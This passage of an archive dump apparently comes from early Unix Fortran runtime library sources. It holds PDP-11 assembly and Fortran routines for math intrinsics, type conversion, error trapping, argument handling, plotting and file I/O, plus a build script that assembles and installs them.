/ amod & dmod fortran functions

.globl	amod.
.globl	dmod.

.globl	retrn
one = 40200
.globl	temp
.globl	rerr

dmod.:	temp
	.+2
	setd
	br	1f

amod.:	temp
	.+2
	setf
1:
	cmp	*2(sp),$2
	bne	1f
	movf	*2(r3),r0
	movf	r0,r2
	movf	*4(r3),r1
	divf	r1,r2
	modf	$one,r2
	mulf	r1,r3
	subf	r3,r0
	movf	r0,temp
	jmp	retrn

1:
	jsr	r5,rerr; 2
-- /usr/source/fort/rt1/atan.s mode=0100664 uid=3 gid=3 atime=174921062 mtime=174844954 --
/
/

/ atan & datan fortran functions

.globl	atan.
.globl	datan.

.globl	atan
.globl	retrn
.globl	temp

datan.:	temp
	.+2
	setd
	br	1f

atan.:	temp
	.+2
	setf
1:
	movf	*2(r3),r0
	jsr	pc,atan
	movf	r0,temp
	jmp	retrn
-- /usr/source/fort/rt1/atan2.s mode=0100664 uid=3 gid=3 atime=174921064 mtime=174844958 --
/
/

/ atan2 & datan2 fortran functions

.globl	atan2.
.globl	datan2.

.globl	retrn
.globl	rerr
.globl	temp
.globl	atan2

datan2.:	temp
	.+2
	setd
	br	1f

atan2.:	temp
	.+2
	setf
1:
	cmp	*2(sp),$2
	bne	1f
	movf	*2(r3),r0
	movf	*4(r3),r1
	jsr	pc,atan2
	movf	r0,temp
	jmp	retrn
1:
	jsr	r5,rerr; 3
-- /usr/source/fort/rt1/cabs.s mode=0100664 uid=3 gid=3 atime=174921067 mtime=174844963 --
/
/

/ cabs fortran function

.globl	cabs.
.globl	dcabs.

.globl	sqrt
.globl	retrn
.globl	rerr
.globl	temp

dcabs.:	temp
	.+2
	setd
	br	1f

cabs.:	temp
	.+2
	setf
1:
	mov	2(r3),r1
	movf	(r1)+,r0
	movf	(r1)+,r1
	jsr	pc,hypot
	bes	1f
	movf	r0,temp
	jmp	retrn
1:
	jsr	r5,rerr; 4
hypot:
	movf	fr1,-(sp)
	absf	fr0
	absf	fr1
	cmpf	fr0,fr1
	cfcc
	bne	1f
	movf	$one,fr0
	br	3f
1:
	blt	2f
	movf	fr0,-(sp)
	movf	fr1,fr0
	movf	(sp)+,fr1
2:
	divf	fr1,fr0
	mulf	fr0,fr0
3:
	addf	$one,fr0
	jsr	pc,sqrt
	mulf	fr1,fr0
	cfcc
	movf	(sp)+,fr1
	rts	pc

one = 40200
-- /usr/source/fort/rt1/ccos.f mode=0100664 uid=3 gid=3 atime=174921069 mtime=174844966 --
	function ccos(z1)
	complex ccos, z1, z2
	dimension dummy(2)
	equivalence (a,z2,dummy(1)), (b,dummy(2))

	z2 = z1
	c = exp(b)
	d = 1.0/c
	b = sin(a)*(d-c)/2.0
	a = cos(a)*(c+d)/2.0
	ccos = z2
	return
	end
-- /usr/source/fort/rt1/cexp.s mode=0100664 uid=3 gid=3 atime=174921072 mtime=174844969 --
/
/

/ cexp fortran function

.globl	cexp.

.globl	rval8p
.globl	retrn
.globl	temp
.globl	rerr
.globl	exp
.globl	sin
.globl	cos

cexp.:	temp
	rval8p; 2
	.+2
	setf
	movf	(sp)+,r0
	jsr	pc,exp
	bes	1f
	movf	r0,temp
	movf	(sp),r0
	jsr	pc,sin
	mulf	temp,r0
	movf	r0,temp+4
	movf	(sp)+,r0
	jsr	pc,cos
	mulf	temp,r0
	movf	r0,temp
	jmp	retrn

1:
	jsr	r5,rerr; 5.
-- /usr/source/fort/rt1/clog.f mode=0100664 uid=3 gid=3 atime=174921074 mtime=174844973 --
	function clog(z1)
	complex clog, z1, z2
	dimension dummy(2)
	equivalence (a,z2,dummy(1)), (b,dummy(2))

	z2 = z1
	c = cabs(z2)
	b = atan2(b, a)
	a = alog(c)
	clog = z2
	return
	end
-- /usr/source/fort/rt1/cmplx.s mode=0100664 uid=3 gid=3 atime=174921077 mtime=174844976 --
/
/

/ cmplx fortran function

.globl	cmplx.
.globl	dcmplx.

.globl	retrn
.globl	temp
.globl	rerr

dcmplx.:temp
	.+2
	setd
	br	1f

cmplx.:	temp
	.+2
	setf
1:
	cmp	*2(sp),$2
	bne	1f
	mov	r3,r1
	tst	(r1)+
	movf	*(r1)+,r0
	movf	*(r1)+,r1
	mov	$temp,r1
	movf	r0,(r1)+
	movf	r1,(r1)+
	jmp	retrn

1:
	jsr	r5,rerr; 6.
-- /usr/source/fort/rt1/conjg.s mode=0100664 uid=3 gid=3 atime=174921079 mtime=174844981 --
/
/

/ conjg fortran function

.globl	conjg.

.globl	rval8p
.globl	retrn
.globl	temp

conjg.:	temp
	rval8p; 2
	.+2
	setf
	movf	(sp)+,r0
	movf	r0,temp
	movf	(sp)+,r0
	negf	r0
	movf	r0,temp+4
	jmp	retrn
-- /usr/source/fort/rt1/cos.s mode=0100664 uid=3 gid=3 atime=174921081 mtime=174844985 --
/
/

/ cos & dcos fortran functions

.globl	cos.
.globl	dcos.

.globl	cos
.globl	retrn
.globl	temp

dcos.:	temp
	.+2
	setd
	br	1f

cos.:	temp
	.+2
	setf
1:
	movf	*2(r3),r0
	jsr	pc,cos
	movf	r0,temp
	jmp	retrn
-- /usr/source/fort/rt1/csin.f mode=0100664 uid=3 gid=3 atime=174921083 mtime=174844988 --
	function csin(z1)
	complex csin, z1, z2
	dimension dummy(2)
	equivalence (a,z2,dummy(1)), (b,dummy(2))

	z2 = z1
	c = exp(b)
	d = 1.0/c
	b = cos(a)*(c-d)/2.0
	a = sin(a)*(c+d)/2.0
	csin = z2
	return
	end
-- /usr/source/fort/rt1/csqrt.f mode=0100664 uid=3 gid=3 atime=174921087 mtime=174844990 --
	function csqrt(z1)
	complex csqrt, z1, z2
	dimension dummy(2)
	equivalence (a,z2,dummy(1)), (b,dummy(2))

	z2 = z1
	c = cabs(z2)
	c = sqrt(c)
	b = atan2(b, a)/2.0
	a = c*cos(b)
	b = c*sin(b)
	csqrt = z2
	return
	end
-- /usr/source/fort/rt1/dble.s mode=0100664 uid=3 gid=3 atime=174921089 mtime=174844994 --
/
/

/ dble fortran function

.globl	dble.

.globl	rval4p
.globl	lval
.globl	r4r8
.globl	gas8
.globl	retrn
.globl	temp

dble.:	temp
	lval; temp
	rval4p; 2
	r4r8
	gas8
	retrn
-- /usr/source/fort/rt1/dccos.f mode=0100664 uid=3 gid=3 atime=174921092 mtime=174845000 --
	function dccos(z1)
	double complex dccos, z1, z2
	double precision dummy(2), a, b, c, d
	equivalence (a,z2,dummy(1)), (b,dummy(2))

	z2 = z1
	c = dexp(b)
	d = 1.0d0/c
	b = dsin(a)*(d-c)/2.0d0
	a = dcos(a)*(c+d)/2.0d0
	dccos = z2
	return
	end
-- /usr/source/fort/rt1/dclog.f mode=0100664 uid=3 gid=3 atime=174921095 mtime=174845002 --
	function dclog(z1)
	double complex z1, z2, dclog
	double precision a,b,c
	double precision dummy(2)
	equivalence (a,z2,dummy(1)), (b,dummy(2))

	z2=z1
	c=dcabs(z2)
	b=datan2(b,a)
	a=dlog(c)
	dclog=z2
	return
	end
-- /usr/source/fort/rt1/dcsin.f mode=0100664 uid=3 gid=3 atime=174921099 mtime=174845005 --
	function dcsin(z1)
	double complex dcsin, z1, z2
	double precision dummy(2), a, b, c, d
	equivalence (a,z2,dummy(1)), (b,dummy(2))

	z2 = z1
	c = dexp(b)
	d = 1.0d0/c
	b = dcos(a)*(c-d)/2.0d0
	a = dsin(a)*(c+d)/2.0d0
	dcsin = z2
	return
	end
-- /usr/source/fort/rt1/dcsqrt.f mode=0100664 uid=3 gid=3 atime=174921102 mtime=174845008 --
	function dcsqrt(z1)
	double complex dcsqrt, z1, z2
	double precision dummy(2), a, b, c
	equivalence (a,z2,dummy(1)), (b,dummy(2))

	z2 = z1
	c = dcabs(z2)
	c = dsqrt(c)
	b = datan2(b, a)/2.0d0
	a = c*dcos(b)
	b = c*dsin(b)
	dcsqrt = z2
	return
	end
-- /usr/source/fort/rt1/dim.s mode=0100664 uid=3 gid=3 atime=174921105 mtime=174845010 --
/
/

/ dim fortran function

.globl	dim.

.globl	retrn
.globl	temp
.globl	rerr
/
dim.:	temp
	.+2
	setf
	cmp	*2(sp),$2
	bne	2f
	movf	*2(r3),r0
	subf	*4(r3),r0
	cfcc
	bge	1f
	clrf	r0
1:
	movf	r0,temp
	jmp	retrn

2:
	jsr	r5,rerr; 7.
-- /usr/source/fort/rt1/dimag.s mode=0100664 uid=3 gid=3 atime=174921107 mtime=174845015 --
/
/

/ dimag fortran function

.globl	dimag.

.globl	rval16p
.globl	retrn
.globl	temp

dimag.:	temp
	rval16p; 2
	.+2
	setd
	tstf	(sp)+
	movf	(sp)+,r0
	movf	r0,temp
	jmp	retrn
-- /usr/source/fort/rt1/exp.s mode=0100664 uid=3 gid=3 atime=174921109 mtime=174845020 --
/
/

/ exp & dexp fortran functions

.globl	exp.
.globl	dexp.

.globl	exp
.globl	retrn
.globl	rerr
.globl	temp

dexp.:	temp
	.+2
	setd
	br	1f

exp.:	temp
	.+2
	setf
1:
	seti
	movf	*2(r3),r0
	jsr	pc,exp
	bes	1f
	movf	r0,temp
	jmp	retrn

1:
	jsr	r5,rerr; 8.
-- /usr/source/fort/rt1/float.s mode=0100664 uid=3 gid=3 atime=174921111 mtime=174845025 --
/
/

/ float fortran function

.globl	float.

.globl	rval4p
.globl	lval
.globl	gas4
.globl	i4r4
.globl	retrn
.globl	temp

float.:	temp
	lval; temp
	rval4p; 2
	i4r4
	gas4
	retrn
-- /usr/source/fort/rt1/iabs.s mode=0100664 uid=3 gid=3 atime=174921112 mtime=174845029 --
/
/

/ iabs fortran function

.globl	iabs.

.globl	retrn
.globl	temp

iabs.:	temp
	.+2
	setl
	setd
	movif	*2(r3),r0
	absf	r0
	movfi	r0,temp
	jmp	retrn
-- /usr/source/fort/rt1/idim.s mode=0100664 uid=3 gid=3 atime=174921114 mtime=174845034 --
/
/

/ idim fortran function

.globl	idim.

.globl	retrn
.globl	rerr
.globl	temp

idim.:	temp
	.+2
	setd
	setl
	cmp	*2(sp),$2
	bne	2f
	movif	*2(r3),r0
	movif	*4(r3),r1
	subf	r1,r0
	cfcc
	bge	1f
	clrf	r0
1:
	movfi	r0,temp
	jmp	retrn

2:
	jsr	r5,rerr; 9.
-- /usr/source/fort/rt1/idint.s mode=0100664 uid=3 gid=3 atime=174921116 mtime=174845038 --
/
/

/ idint fortran function

.globl	idint.

.globl	retrn
.globl	temp

idint.:	temp
	.+2
	setd
	setl
	movf	*2(r3),r0
	movfi	r0,temp
	jmp	retrn
-- /usr/source/fort/rt1/ierr.s mode=0100664 uid=3 gid=3 atime=174921118 mtime=174845042 --
/
/

/ catch runtime errors:
/ if (ierror(errno)) goto place
/ on call, returns 0
/ on occurrence of error, returns non-zero

.globl	ierror.
.globl	erret

.globl	rerr
.globl	retrn

ierror.:zero
	.+2
	mov	2(r3),r0
	mov	2(r0),r1
	mov	$errbuf,r0
1:
	cmp	r0,cerrp
	blo	2f
	cmp	cerrp,$eerbuf
	blo	3f
	jsr	r5,rerr; 120.
3:
	add	$8,cerrp
	br	1f
2:
	cmp	r1,(r0)
	beq	1f
	add	$8,r0
	br	1b
1:
	mov	r1,(r0)+
	mov	r3,(r0)+
	mov	2(sp),(r0)+
	mov	4(sp),(r0)+
	jmp	retrn

.data
erret:
	jmp	9f
.text
9:
	mov	$errbuf,r0
	cmp	(r0),r1
	beq	1f
	add	$8,r0
	cmp	r0,cerrp
	blo	1b
	rts	pc
1:
	add	$8,r0
	mov	-(r0),-(sp)
	mov	-(r0),-(sp)
	mov	$one,-(sp)
	mov	-(r0),r3
	jmp	retrn

.data
one:	77777; 177777
zero:	0; 0

cerrp:	errbuf

.bss
errbuf:	.=.+50
eerbuf:
-- /usr/source/fort/rt1/ifix.s mode=0100664 uid=3 gid=3 atime=174921120 mtime=174845046 --
/
/

/ ifix & int fortran functions

.globl	ifix.
.globl	int.

.globl	lval
.globl	r4i4
.globl	gas4
.globl	rval4p
.globl	retrn
.globl	temp

int.:
ifix.:	temp
	lval; temp
	rval4p; 2
	r4i4
	gas4
	retrn
-- /usr/source/fort/rt1/isign.s mode=0100664 uid=3 gid=3 atime=174921122 mtime=174845050 --
/
/

/ isign fortran function

.globl	isign.

.globl	retrn
.globl	rerr
.globl	temp

isign.:	temp
	.+2
	setd
	setl
	cmp	*2(sp),$2
	bne	2f
	movif	*2(r3),r0
	absf	r0
	movif	*4(r3),r1
	cfcc
	bge	1f
	negf	r0
1:
	movfi	r0,temp
	jmp	retrn

2:
	jsr	r5,rerr; 10.
-- /usr/source/fort/rt1/mod.s mode=0100664 uid=3 gid=3 atime=174921124 mtime=174845055 --
/
/

/ mod fortran function

.globl	mod.

.globl	retrn
.globl	temp
one = 40200
.globl	rerr

mod.:	temp
	.+2
	setd
	setl
	cmp	*2(sp),$2
	bne	1f
	movif	*2(r3),r0
	movf	r0,r2
	movif	*4(r3),r1
	divf	r1,r2
	modf	$one,r2
	mulf	r1,r3
	subf	r3,r0
	movfi	r0,temp
	jmp	retrn

1:
	jsr	r5,rerr; 11.
-- /usr/source/fort/rt1/real.s mode=0100664 uid=3 gid=3 atime=174921127 mtime=174845058 --
/
/

/ real & dreal fortran function

.globl	real.
.globl	dreal.

.globl	retrn
.globl	temp

dreal.:	temp
	.+2
	setd
	br	1f

real.:	temp
	.+2
	setf
1:
	movf	*2(r3),r0
	movf	r0,temp
	jmp	retrn
-- /usr/source/fort/rt1/sign.s mode=0100664 uid=3 gid=3 atime=174921129 mtime=174845063 --
/
/

/ sign & dsign fortran functions

.globl	sign.
.globl	dsign.

.globl	retrn
.globl	temp
.globl	rerr

dsign.:	temp
	.+2
	setd
	br	1f

sign.:	temp
	.+2
	setf
1:
	cmp	*2(sp),$2
	bne	2f
	movf	*2(r3),r0
	absf	r0
	tstf	*4(r3)
	cfcc
	bge	1f
	negf	r0
1:
	movf	r0,temp
	jmp	retrn

2:
	jsr	r5,rerr; 12.
-- /usr/source/fort/rt1/sin.s mode=0100664 uid=3 gid=3 atime=174921131 mtime=174845067 --
/
/

/ sin & dsin fortran functions

.globl	sin.
.globl	dsin.

.globl	sin
.globl	retrn
.globl	temp

dsin.:	temp
	.+2
	setd
	br	1f

sin.:	temp
	.+2
	setf
1:
	movf	*2(r3),r0
	jsr	pc,sin
	movf	r0,temp
	jmp	retrn
-- /usr/source/fort/rt1/sngl.s mode=0100664 uid=3 gid=3 atime=174921132 mtime=174845070 --
/
/

/ sngl fortran function

.globl	sngl.

.globl	rval8p
.globl	lval
.globl	r8r4
.globl	gas4
.globl	retrn
.globl	temp

sngl.:	temp
	lval; temp
	rval8p; 2
	r8r4
	gas4
	retrn
-- /usr/source/fort/rt1/sqrt.s mode=0100664 uid=3 gid=3 atime=174921134 mtime=174845075 --
/
/

/ sqrt & dsqrt fortran functions

.globl	sqrt.
.globl	dsqrt.

.globl	sqrt
.globl	retrn
.globl	rerr
.globl	temp

dsqrt.:	temp
	.+2
	setd
	br	1f

sqrt.:	temp
	.+2
	setf
1:
	movf	*2(r3),r0
	jsr	pc,sqrt
	bes	1f
	movf	r0,temp
	jmp	retrn
1:
	jsr	r5,rerr; 13.
-- /usr/source/fort/rt1/tanh.f mode=0100664 uid=3 gid=3 atime=174921137 mtime=174845077 --
	function tanh(a)

	b = exp(a)
	c = 1.0/b
	tanh = (b-c)/(b+c)
	return
	end
-- /usr/source/fort/rt2 mode=0140775 uid=3 gid=3 atime=174930097 mtime=174921160 --
-- /usr/source/fort/rt2/ctime.s mode=0100664 uid=3 gid=3 atime=174921147 mtime=174844858 --
.globl	ctime., retrn, temp
ctime.:	temp
	.+2
	sys	time
	clr	temp
	mov	r0,temp+2
	setd
	setl
	movif	temp,fr0
	mulf	$44200,fr0
	mov	r1,temp+2
	movif	temp,fr1
	addf	fr1,fr0
	movf	fr0,temp
	jmp	retrn
-- /usr/source/fort/rt2/getarg.s mode=0100664 uid=3 gid=3 atime=174921149 mtime=174844861 --
/ call getarg(n, array [, nword] )
/
/ fill in the array with the n-th argument to the routine.
/ array is integer.
/ n counts from 1 for the file name (first) arg
/ if nword is specifies it gives the max number
/ of words to fill in
/ If no nword is given the array ends with at least one blank.
/ if nword is given the array is blank-padded to that length.

/ iargc(dummy) returns the number of arguments
/ (1-origin)

.globl	getarg., iargc.
.globl	retrn, temp
.comm	argp,2

getarg.:
	temp
	.+2
	mov	$512.,r2
	cmp	*2(sp),$3
	blt	1f
	mov	6(r3),r2
	mov	2(r2),r2
	asl	r2
	asl	r2
1:
	mov	4(r3),r4
	mov	2(r3),r1
	mov	2(r1),r1
	mov	argp,r0
	cmp	r1,(r0)
	bgt	1f
	asl	r1
	add	r0,r1
	mov	(r1),r1
2:
	tst	r2
	ble	1f
	movb	(r1)+,(r4)+
	beq	2f
	dec	r2
	br	2b
2:
	dec	r4
1:
	movb	$' ,(r4)+
	dec	r2
	bit	$3,r2
	bne	1b
	cmp	r2,$256.
	bge	1f
	tst	r2
	bgt	1b
1:
	jmp	retrn

iargc.:
	temp
	.+2
	clr	temp
	mov	*argp,temp+2
	jmp	retrn
-- /usr/source/fort/rt2/nice.s mode=0100664 uid=3 gid=3 atime=174921151 mtime=174844863 --
/
/

/ fortran nice subroutine

.globl	nice.
.globl	retrn, temp

nice.:
	temp
	.+2
	mov	$16.,r0
	tst	*2(sp)
	beq	1f
	mov	2(r3),r0
	mov	2(r0),r0
1:
	sys	nice
	jmp	retrn

-- /usr/source/fort/rt2/openrw.s mode=0100664 uid=3 gid=3 atime=174844868 mtime=174844868 --
/
/

/ openr, openw--
/
/ call open(r|w) (string, iunit)
/   or,
/ call open(r|w) (argno, iunit)
/ where argno is an argument number (0 is command name)

.globl	openr.
.globl	openw.

.globl	utable
.globl	btable
.globl	ftable
.globl	getbuf
.globl	fopen
.globl	fcreat

openr.:	temp
	.+2
	mov	pc,-(sp)
	br	1f

openw.:	temp
	.+2
	clr	-(sp)
1:
	mov	4(r3),r1
	mov	2(r1),r1
	jsr	r5,chkunit
	tstb	utable(r1)
	beq	1f
	jsr	r5,rerr; 101.
	sys	exit
1:
	jsr	r5,getbuf
	mov	2(r3),r0
	mov	2(r0),r0
	cmp	r0,$32.
	bhi	1f
	cmp	r0,*argp
	bhi	err
	asl	r0
	add	argp,r0
	br	2f
1:
	tst	(sp)+
	beq	1f
	movb	$1,utable(r1)
-- /usr/source/fort/rt2/plot.s mode=0100664 uid=3 gid=3 atime=174844872 mtime=174844872 --
/
/

/ move, line

sct = 2
/ fortran vt0 interfaces

/ erase screen

erase.:	temp
	.+2
	jsr	pc,setfil
	mov	f,r0
	sys	write; erase; 2
	jmp	retrn

/	move(x, y)
/
/	sets current x,y to arguments
/

.globl	move.
.globl	line.
.globl	erase.
.globl	frame.
.globl	arc.
.globl	circle.

.globl	temp
.globl	retrn

frame.:	temp
	.+2
	jsr	pc,setfil
	mov	2(r3),r0
	movb	2(r0),frame+1
	mov	f,r0
	sys	write; frame; 2
	jmp	retrn

move.:	temp
	.+2
	jsr	pc,garg
	mov	r0,x
	mov	r1,y
	jmp	retrn

/	line(x, y)
/
/	plot vector from current x,y
/	to arguments, setting current
/	x,y when done to arguments
/

line.:	temp
	.+2
	jsr	pc,garg
	mov	r0,x1
	mov	r1,y1
	movb	$3,command
	mov	f,r0
	sys	write; command; 9
	mov	x1,x
	mov	y1,y
	jmp	retrn

/ call circle(x, y, radius)
/ circle's center at x, y

circle.:temp
	.+2
	jsr	pc,garg
	mov	r0,x
	mov	r1,y
	mov	6(r3),r0
	mov	2(r0),r0
	ash	$2,r0
	mov	r0,x1
	movb	$5,command
	mov	f,r0
	sys	write; command; 7
	jmp	retrn

/ call arc(xo, yo, x1, y1, x2, y2)
/ plot circle arc: origin xo,yo;
/ counterclockwise from x1,y1 to x2,y2

arc.:	temp
	.+2
	jsr	pc,garg
	mov	r0,x
	mov	r1,y
	cmp	(r3)+,(r3)+
	jsr	pc,garg
	mov	r0,x1
	mov	r1,y1
	cmp	(r3)+,(r3)+
	jsr	pc,garg
	mov	r0,x2
	mov	r1,y2
	movb	$6,command
	mov	f,r0
	sys	write; command; 13.
	sub	$8.,r3
	jmp	retrn

setfil:
	tst	f
	bne	1f
	sys	creat; vt; 17
	bes	9f
	mov	r0,f
1:
	rts	pc

garg:
	jsr	pc,setfil
	mov	2(r3),r0
	mov	2(r0),r0
	mov	4(r3),r1
	mov	2(r1),r1
	ash	$2,r0
	ash	$2,r1
	sub	$2048.,r0
	sub	$2048.,r1
	rts	pc
9:
	mov	$1,r0
	sys	write; bmes; emes-bmes
	sys	exit

frame:	.byte	4,0
erase:	.byte	1,1
	.byte	0
vt:	</dev/vt0\0>
bmes:	<VT unwritable.\n>; emes:
	.bss
	.=.+1
command:.=.+1
x:	.=.+2
y:	.=.+2
x1:	.=.+2
y1:	.=.+2
x2:	.=.+2
y2:	.=.+2
f:	.=.+2
-- /usr/source/fort/rt2/rand.s mode=0100664 uid=3 gid=3 atime=174921153 mtime=174844876 --
/ fortran random number generator.
/ either single or double prec.

.globl	rand., srand.
.globl	retrn

srand.:
	value
	.+2
	mov	*2(r3),seed1
	inc	first
	jmp	retrn

rand.:
	value
	.+2
	tst	first
	bne	1f
	sys	time
	mov	r1,seed1
	inc	first
1:
	mov	seed1,r1
	jsr	pc,ran
	mov	r1,seed1
	seti
	setd
	movif	r0,fr0
	divf	$44000,fr0
	movf	fr0,value
	jmp	retrn

ran:
	mpy	$13077.,r1
	add	$6925.,r1
	mov	r1,r0
	bic	$100000,r0
	rts	pc

.bss
first:	.=.+2
seed1:	.=.+2
value:	.=.+8
-- /usr/source/fort/rt2/rio.s mode=0100664 uid=3 gid=3 atime=174844878 mtime=174844878 --
/
/

/ fortran random I/O

.globl	rread.
.globl	rwrite.

.globl	temp
.globl	retrn
.globl	rerr

rread.:	temp
	.+2
	mov	2(r3),r0
	mov	2(r0),0f
	mov	rfin,r0
	bne	1f
	sys	open; rf; 0
	bes	9f
	mov	r0,rfin
1:
	sys	seek; 0:..; 0
	mov	4(r3),0f
	mov	6(r3),r0
	mov	2(r0),0f+2
	mov	rfin,r0
	sys	read; 0:..; 0
	jmp	retrn

rwrite.:temp
	.+2
	mov	2(r3),r0
	mov	2(r0),0f
	mov	rfout,r0
	bne	1f
	sys	creat; rf; 17
	bes	9f
	mov	r0,rfout
1:
	sys	seek; 0:..; 0
	mov	4(r3),0f
	mov	6(r3),r0
	mov	2(r0),0f+2
	mov	rfout,r0
	sys	write; 0:..; ..
	jmp	retrn

9:
	jsr	r5,rerr; 456.
	sys	exit

rf:
	<fortrf\0>
	.even
rfin:	.=.+2
rfout:	.=.+2

-- /usr/source/fort/rt2/setfil.s mode=0100664 uid=3 gid=3 atime=174921155 mtime=174844881 --
/ Fortran library-- setfil

/ call setfil(unit, 5hname )

.globl	setfil.

.globl	getbuf
.globl	chkunit
.globl	retrn
.globl	utable
.globl	temp
.globl	rerr

setfil.:
	temp
	.+2
	mov	2(r3),r1
	mov	2(r1),r1
	jsr	r5,chkunit
	tstb	utable(r1)
	beq	1f
	jsr	r5,rerr; 112.
1:
	jsr	r5,getbuf
	movb	$-1,utable(r1)
	mov	4(r3),r0
	mov	r2,r1
1:
	movb	(r0)+,(r1)
	beq	1f
	cmpb	$' ,(r1)+
	bne	1b
	clrb	-(r1)
1:
	jmp	retrn
-- /usr/source/fort/rt2/uio.s mode=0100664 uid=3 gid=3 atime=174921157 mtime=174844885 --
/ fortran to UNIX IO
/
.globl	read.
.globl	write.
.globl	seek.
.globl	seek0.
.globl	open.
.globl	creat.
.globl	close.
.globl	errno.

indir	= 0

/	integer function read(f, a, n)
/	integer f, n
/	logical*1 a(n)
/		same as C

read.:
	temp
	rval4p; 2	/ f
	i4i2
	lvalp; 4	/ a
	rval4p; 6	/ n
	i4i2
	.+2
	mov	(sp)+,9f+4
	mov	(sp)+,9f+2
	mov	(sp)+,r0
	sys	indir; 9f
	br	ret

.data
9:	sys	read; ..; ..
.text

/	integer function read(f, a, n)
/	integer f, n
/	logical*1 a(n)
/		same as C

write.:
	temp
	rval4p; 2	/ f
	i4i2
	lvalp; 4	/ a
	rval4p; 6	/ n
	i4i2
	.+2
	mov	(sp)+,9f+4
	mov	(sp)+,9f+2
	mov	(sp)+,r0
	sys	indir; 9f
	br	ret

.data
9:	sys	write; ..; ..
.text

/	integer function seek(f, o, b)
/	integer f, o, b
/		same as C

seek.:
	temp
	rval4p; 2	/ f
	i4i2
	rval4p; 4	/ o
	i4i2
	rval4p; 6	/ b
	i4i2
	.+2
	mov	(sp)+,9f+4
	mov	(sp)+,9f+2
	mov	(sp)+,r0
	sys	indir; 9f
	br	ret

/	integer function seek0(f, n)
/	integer f, n
/		same as seek(f, n, 0)
/		but with 24 bit `n'

seek0.:
	temp
	rval4p; 2	/ f
	i4i2
	rval4p; 4	/ n
	.+2
	mov	(sp)+,r0
	mov	(sp),r1
	bic	$!777,(sp)
	ashc	$-9.,r0
	mov	r1,9f+2
	mov	$3,9f+4
	mov	2(sp),r0
	sys	indir; 9f	/ to block
	mov	(sp)+,9f+2
	mov	$1,9f+4
	mov	(sp)+,r0
	sys	indir; 9f	/ to byte within block
	br	ret

.data
9:	sys	seek; ..; ..
.text

/	integer function open(a, m)
/	logical*1 a(n)
/	integer m
/		same as C, name is ` ' terminated

open.:
	temp
	lvalp; 2	/ a
	rval4p; 4	/ m
	i4i2
	.+2
	mov	(sp)+,9f+4
	mov	(sp)+,r0
	mov	r0,9f+2
1:
	cmpb	(r0)+,$' /
	bne	1b
	clrb	-(r0)
	sys	indir; 9f
	br	ret

.data
9:	sys	open; ..; ..
.text

/	integer function creat(a, m)
/	logical*1 a(n)
/	integer m
/		same as C, name is ` ' terminated

creat.:
	temp
	lvalp; 2	/ a
	rval4p; 4	/ m
	i4i2
	.+2
	mov	(sp)+,9f+4
	mov	(sp)+,r0
	mov	r0,9f+2
1:
	cmpb	(r0)+,$' /
	bne	1b
	clrb	-(r0)
	sys	indir; 9f
	br	ret

.data
9:	sys	creat; ..; ..
.text

/	integer function close(f)
/	integer f
/		same as C

close.:
	temp
	rval4p; 2	/ f
	i4i2
	.+2
	mov	(sp)+,r0
	sys	close

ret:
	bec	1f
	mov	r0,error
	mov	$-1,r0
1:
	mov	r0,temp+2
	sxt	temp
	jmp	retrn

/	error = errno
/		returns last error number

errno.:
	temp
	.+2
	mov	error,r0
	br	ret

.globl	temp
.globl	retrn
.globl	rval4p
.globl	lvalp
.globl	i4i2
.bss
error:	.=.+2
-- /usr/source/fort/run mode=0100664 uid=3 gid=3 atime=174921160 mtime=174917271 --
chdir f1
as ../fx/fhd.s f11.s; mv a.out f11.o
as ../fx/fhd.s f12.s; mv a.out f12.o
as ../fx/fhd.s f13.s; mv a.out f13.o
as ../fx/fhd.s f14.s; mv a.out f14.o
as ../fx/fhd.s f15.s; mv a.out f15.o
as ../fx/fhd.s f16.s; mv a.out f16.o
as ../fx/fhd.s f17.s; mv a.out f17.o
ld -r *.o
mv a.out ..
rm *.o

chdir ../f2
as ../fx/fhd.s f21.s; mv a.out f21.o
as ../fx/fhd.s f22.s; mv a.out f22.o
as ../fx/fhd.s f23.s; mv a.out f23.o
as ../fx/fhd.s f24.s; mv a.out f24.o
ld -r ../a.out *.o
mv a.out ..
rm *.o

chdir ../f3
as ../fx/fhd.s f31.s; mv a.out f31.o
as ../fx/fhd.s f32.s; mv a.out f32.o
as ../fx/fhd.s f33.s; mv a.out f33.o
as ../fx/fhd.s f34.s; mv a.out f34.o
as ../fx/fhd.s f35.s; mv a.out f35.o
as ../fx/fhd.s f36.s; mv a.out f36.o
as ../fx/fhd.s f37.s; mv a.out f37.o
as ../fx/fhd.s f38.s; mv a.out f38.o
as ../fx/fhd.s f39.s; mv a.out f39.o
ld -r ../a.out *.o
mv a.out ..
rm *.o

chdir ../f4
as ../fx/fhd.s f41.s; mv a.out f41.o
as ../fx/fhd.s f42.s; mv a.out f42.o
as ../fx/fhd.s f43.s; mv a.out f43.o
as ../fx/fhd.s f44.s; mv a.out f44.o
as ../fx/fhd.s f45.s; mv a.out f45.o
as ../fx/fhd.s f46.s; mv a.out f46.o
as ../fx/fhd.s f47.s; mv a.out f47.o
ld -r ../a.out *.o
mv a.out ..
rm *.o

chdir ../fx
as fhd.s fx1.s; mv a.out fx1.o
as fhd.s fx2.s; mv a.out fx2.o
as fhd.s fx3.s; mv a.out fx3.o
as fhd.s fx4.s; mv a.out fx4.o
as fhd.s fx5.s; mv a.out fx5.o
as fhd.s fx6.s; mv a.out fx6.o
as fhd.s fx7.s; mv a.out fx7.o
as fhd.s fx8.s; mv a.out fx8.o
as fhd.s fx9.s; mv a.out fx9.o
as fhd.s fxa.s; mv a.out fxa.o
as fhd.s fxb.s; mv a.out fxb.o
as fhd.s fxc.s; mv a.out fxc.o
as fhd.s fxd.s; mv a.out fxd.o
as fhd.s fxe.s; mv a.out fxe.o
as fhd.s fxf.s; mv a.out fxf.o
as fhd.s fxg.s; mv a.out fxg.o
as fhd.s fxh.s; mv a.out fxh.o
as fhd.s fxi.s; mv a.out fxi.o
as fhd.s fxx.s; mv a.out fxx.o
ld -r ../a.out *.o
mv a.out ..
rm *.o

chdir ..
ld -s a.out -l
cmp a.out /usr/fort/fc1
cp a.out /usr/fort/fc1
rm a.out

chdir io
as io?.s
mv a.out io.o
ar r /lib/filib.a io.o
rm io.o

chdir ../rt
as r0.s
cmp a.out /lib/fr0.o
cp a.out /lib/fr0.o
as r1.s; mv a.out r1.o
as r2.s; mv a.out r2.o
as r3.s; mv a.out r3.o
as r4.s; mv a.out r4.o
as r5.s; mv a.out r5.o
as r6.s; mv a.out r6.o
as r7.s; mv a.out r7.o
as r8.s; mv a.out r8.o
as r9.s; mv a.out r9.o
as ra.s; mv a.out ra.o
as rb.s; mv a.out rb.o
as rc.s; mv a.out rc.o
